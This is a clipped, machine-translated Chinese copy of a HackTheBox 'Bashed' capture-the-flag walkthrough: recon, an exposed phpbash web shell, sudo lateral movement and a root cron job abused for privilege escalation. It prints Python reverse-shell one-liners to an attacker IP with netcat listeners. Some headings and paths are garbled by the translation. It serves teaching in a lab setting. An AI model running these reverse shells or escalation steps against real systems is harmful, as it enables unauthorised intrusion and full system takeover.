# 
web页面有shell  sudo -u横移   cron提权


# 高温透射率：被抨击

[0xdf.gitlab.io](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)0xdf黑客的东西

巴什德今天从 hackthebox.eu 退休。以下是我的笔记，已转换为演练。这些笔记来自几个月前，它们有点原始，但无论如何都要在这里发布。

*   用户
*   外壳升级
*   根

## 用户

初始 nmap 扫描仅显示端口 80：

  
```
  root@kali:/media/sf_CTFs/hackthebox/bashed-10.10.10.68# nmap -sV -sC -oA nmap/initial 10.10.10.68
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-06 20:40 EST
    Nmap scan report for 10.10.10.68
    Host is up (0.098s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http?
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 31.85 second
```
s
    

该页面是一个博客，其中包含一篇关于phpbash的文章：![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fphpbash.png) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fmain.png)

因此，让我们启动gobuster，看看该网站的样子：

    root@kali:/media/sf_CTFs/hackthebox/bashed-10.10.10.68# gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.68/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307
    =====================================================
    /images (Status: 301)
    /uploads (Status: 301)
    /php (Status: 301)
    /css (Status: 301)
    /dev (Status: 301)
    /js (Status: 301)
    /fonts (Status: 301)
    

`/dev`很有趣。并允许步行：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Findex_of_dev.png)

点击 phpbash 会得到一个外壳：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fphpbash_shell.png)

/家/阿雷塞尔内部是用户标志：

    www-data@bashed:/home/arrexel# ls
    user.txt
    www-data@bashed:/home/arrexel# wc -c user.txt
    33 user.txt
    

## 外壳升级

在 phpbash 中，运行：

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

当地卡利：

    root@kali:/media/sf_CTFs/hackthebox/bashed-10.10.10.68# nc -lnvp 1235
    listening on [any] 1235 ...
    connect to [10.10.14.157] from (UNKNOWN) [10.10.10.68] 49932
    /bin/sh: 0: can't access tty; job control turned off
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    www-data@bashed:/var/www/html/dev$
    

## 根

从 LinEnum.sh 开始，获取有关隐私的信息。本节突出：

    
```
www-data can sudo as scriptmanager:
    We can sudo without supplying a password!
    Matching Defaults entries for www-data on bashed:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on bashed:
        (scriptmanager : scriptmanager) NOPASSWD: ALL
```

    

很容易得到一个外壳作为脚本管理器：`sudo -u scriptmanager /bin/bash`

现在，脚本管理器可以访问 www 数据无法访问的文件夹：

    $ ls -ld /scripts
    drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec  4 18:06 /scripts
    

在该目录中，有两个文件：

   
```
 scriptmanager@bashed:/scripts$ ls -l
    total 8
    -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 17:03 test.py
    -rw-r--r-- 1 root          root          12 Mar  7 04:09 test.txt
    
    scriptmanager@bashed:/scripts$ cat test.py
    f = open("test.txt", "w")
    f.write("testing 123!")
    f.close
    
    scriptmanager@bashed:/scripts$ cat test.txt
    testing 123!
```

    

最有趣的是，测试.txt文件归root所有，似乎是脚本管理器可写的 test.py 脚本的结果。

首先，我尝试移动测试.txt测试.txt.old。几分钟后，它又回来了：

 
```
   scriptmanager@bashed:/scripts$ date
    Wed Mar  7 05:37:32 PST 2018
    
    scriptmanager@bashed:/scripts$ ls
    test.py  test.txt.old  test2.py  test3.py  testt.py
    
    scriptmanager@bashed:/scripts$ date
    Wed Mar  7 05:39:14 PST 2018
    
    scriptmanager@bashed:/scripts$ ls
    test.py  test.txt  test.txt.old  test2.py  test3.py  testt.py
```

    

正在运行某些内容，该内容 test.py /scripts 目录中的脚本。

创建一个写入其他文件的测试脚本，然后写入不同的文件。因此，似乎正在运行任何.py文件。另外，由于 test.py 没有#！一开始，似乎任何运行这个的东西（也许是一个cron？）都在叫python。

可以只编写一个读取 /root/root 的脚本.txt并在其他地方写入，但最好得到一个 shell！创建漏洞利用：

    scriptmanager@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
    

在 Kali 上，设置一个侦听器，并获取根外壳：

    root@kali:/media/sf_CTFs/hackthebox/bashed-10.10.10.68# nc -lnvp 31337
    listening on [any] 31337 ...
    connect to [10.10.14.157] from (UNKNOWN) [10.10.10.68] 47806
    /bin/sh: 0: can't access tty; job control turned off
    
    # id
    uid=0(root) gid=0(root) groups=0(root)
    
    # python -c 'import pty; pty.spawn("/bin/bash")'
    
    root@bashed:/scripts# crontab -l
    * * * * * cd /scripts; for f in *.py; do python "$f"; done
    
    root@bashed:/scripts# wc -l /root/root.txt
    33 /root/root.txt
    

正如预期的那样，有一个 cron 以 root 身份从 /scripts 目录运行脚本。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)